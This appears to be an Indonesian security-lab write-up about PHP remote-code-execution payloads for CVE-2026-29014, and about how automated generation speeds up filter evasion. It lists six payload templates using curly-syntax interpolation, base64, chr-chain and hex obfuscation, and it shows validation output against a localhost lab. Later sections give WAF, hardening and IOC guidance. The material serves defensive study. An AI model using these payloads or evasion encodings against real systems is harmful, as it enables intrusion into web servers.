# Peran AI dalam Pembuatan Payload RCE — dan Konsekuensinya

Catatan ini menjawab pertanyaan inti: *"jaman AI harusnya bisa lebih mudah
membuat payload untuk melakukan penyerangan RCE"*. Jawabannya: **benar** — dan
repo ini berisi buktinya, bukan cuma klaim.

---

## 1. Yang Ai benar-benar perhatikan

Payload RCE PHP pada CVE-2026-29014 bukan satu string statis. Ia adalah
komposisi dari beberapa hal yang harus cocok persis:

1. **Konteks string** — payload diletakkan di dalam `double-quoted string`
   (`$cache="{...}"`), sehingga `system('id')` biasa **tidak** dieksekusi.
   Yang jalan adalah *complex (curly) syntax* `{${...}}`.
2. **Closure yang benar** — `{${...}}.${die()}}` dipakai agar eksekusi berhenti
   sebelum sisa file (`";`) menjadi syntax error.
3. **Encoding yang lolos filter** — `base64_decode`, rantai `chr()`, `\xNN`,
   `gzdecode`, atau apa pun yang diperlukan untuk mengganti payload saat filter
   diperketat.
4. **Transport** — payload dikirim lewat header (`C:`) supaya tahap-2 reusable
   untuk perintah berbeda.
5. **Nama header di-obfuscate** — `HTTP_C` ditulis sebagai
   `chr(72).chr(84).chr(84).chr(80).chr(95).chr(67)` supaya filter yang mencari
   literal `HTTP_C` tidak kena.

Hitung manual itu membosankan: `chr()` untuk 5 karakter = 5 operasi; payload
command yang lebih panjang = ratusan operasi, masing-masing harus benar.
Ditambah base64 yang panjangnya harus pas, dan `${` `}` harus tetap seimbang.

**AI (atau generator terprogram apa pun) menghapus pekerjaan membosankan itu.**
Yang tersisa adalah keputusan creative: *encoding* mana yang dipakai, *transport*
mana yang dipakai, apakah perlu tahap tambahan.

---

## 2. Buktinya: generator payload di lab ini

`exploit/payload_gen.py` membangkitkan 6 varian dari satu perintah shell:

| Varian | Bentuk | Keterangan |
|---|---|---|
| `complex_curly` | `{${eval(base64_decode($_SERVER[chr(72)...]))}}.${die()}}` | payload lewat header, 2 tahap |
| `eval_b64` | `{${eval(base64_decode('<b64>'))}}.${die()}}` | payload inline, base64 |
| `chr_chain` | `{${eval(chr(99).chr(104)...)}.${die()}}` | lolos filter kata kunci |
| `hex_escape` | `{${eval("\x63\x68...")}.${die()}}` | lolos filter kata kunci |
| `gzip_b64` | `{${eval(gzdecode(base64_decode('<b64>')))}.${die()}}` | payload inline, terkompresi |
| `raw` | `{${system("echo _____; id; echo _____")}.${die()}}` | baseline tanpa encoding |

Hasil validasi otomatis terhadap lab:

```console
$ python3 exploit/payload_gen.py -c 'id' --validate
validasi terhadap http://127.0.0.1:8099 (command: 'id')
    [+] complex_curly  RCE OK -> uid=1000(kali) gid=1000(kali) groups=...
    [+] eval_b64       RCE OK -> uid=1000(kali) gid=1000(kali) groups=...
    [+] chr_chain      RCE OK -> uid=1000(kali) gid=1000(kali) groups=...
    [+] hex_escape     RCE OK -> uid=1000(kali) gid=1000(kali) groups=...
    [+] gzip_b64       RCE OK -> uid=1000(kali) gid=1000(kali) groups=...
    [+] raw            RCE OK -> uid=1000(kali) gid=1000(kali) groups=...

berhasil: 6/6
```

Perhatikan bahwa **generator ini tidak hard-code payload** — ia tahu aturan
mainnya (payload harus dibungkus complex-curly syntax + `die()`, harus
di-decode dengan fungsi yang cocok, output harus bisa diparse) dan
meng konkretkannya itu ke berbagai encoding. Itulah persis posisi di mana
AI unggul: mengubah
*kaidah* menjadi banyak bentuk konkret yang langsung diuji.

---

## 3. Yang tidak berubah: biaya eksploitasi tetap rendah

Yang perlu digarisbawahi: **AI tidak membuat kerentanan ini ada**.

* Primitive yang dibutuhkan tetap sama: `include` dengan path attacker-controlled
  + `file_put_contents` tanpa escaping + interpolasi string PHP.
* API yang dibutuhkan tetap 2 request HTTP biasa — tanpa auth, tanpa WAF
  bypass yang rumit.
* Remediasi tetap sama: perbaiki kodenya, bukan perbaiki payload-nya.

Yang berubah adalah **waktu** yang dibutuhkan penyerang untuk sampai ke
payload yang lolos filter, dan **skala**: satu payload bisa di-obfuscate ulang
10 kali dalam hitungan detik, jadi filter yang berbasis signature eksak akan
kalah cepat.

---

## 4. Konsekuensi untuk pertahanan

### 4.1 Filter berbasis signature eksak tidak akan bertahan

Aturan seperti "block kalau body mengandung `base64_decode`" mudah dilewati
dengan `chr_chain` atau `hex_escape`; aturan "block kalau header `C` berisi
base64" dilewati dengan encoding lain.

Yang bertahan: **aturan berbasis struktur**:
* path traversal (`../`) — butuh untuk primitive-nya,
* `${...}` — tanda interpolasi complex-curly,
* fungsi PHP yang bisa mengeksekusi (`eval`, `assert`, `system`, `passthru`, …),
* `$_SERVER['HTTP_...']` di dalam body.

Aturan-aturan ini ada di `../defense/modsecurity-rules.conf` dan hanya
bergantung pada *bentuk*, bukan pada *isi* payload.

### 4.2 Root cause > signature

Aturan WAF bisa everlasting, tapi **menonaktifkan PHP engine di direktori
cache/upload** membuat exploit gagal secara struktural: file `.php` tetap
tertulis, tapi tidak pernah dieksekusi. Primitive "write file" yang tadinya
setara RCE menjadi sekadar file membusuk. Ini contoh why mitigasi yang
menyerang *capability* lebih kuat daripada yang menyerang *signature*.

### 4.3 IOC harus korelatif, bukan tunggal

Tidak ada satu IOC pun dari payload ini yang spesifik. Yang stabil adalah
**korelasi**:

```
request ke endpoint weixin/doapi  +  "adminlogin"  +  traversal  +  file .php
baru di direktori cache  +  OOM/fatal error di log  →  insiden
```

`../defense/ioc_hunt.py` mencari masing-masing komponen itu dan menandai
korelasi `critical` bila beberapa muncul bersamaan.

---

## 5. Batasan etis & praktik

Lab ini sengaja dibuat **hanya berjalan di 127.0.0.1** dan memakai **replika**
kode rentan, bukan instalasi CMS produksi yang ditembak:

* Tidak ada target pihak ketiga yang diserang.
* Tidak ada bypass autentikasi pada sistem nyata.
* Semua artefak offense ada di repo ini dengan tujuan defensif:
  understanding, deteksi, dan hardening.

Kalau Anda memakai pengetahuan ini untuk defensi, urutan yang paling
efektif:

1. Upgrade PHP (menutup 2 CVE core).
2. Patch aplikasi (menutup CVE-2026-29014).
3. Matikan PHP engine di direktori cache/upload.
4. Pasang rules WAF + IOC hunting.
5. Audit log historis untuk melihat apakah sudah dieksploitasi.
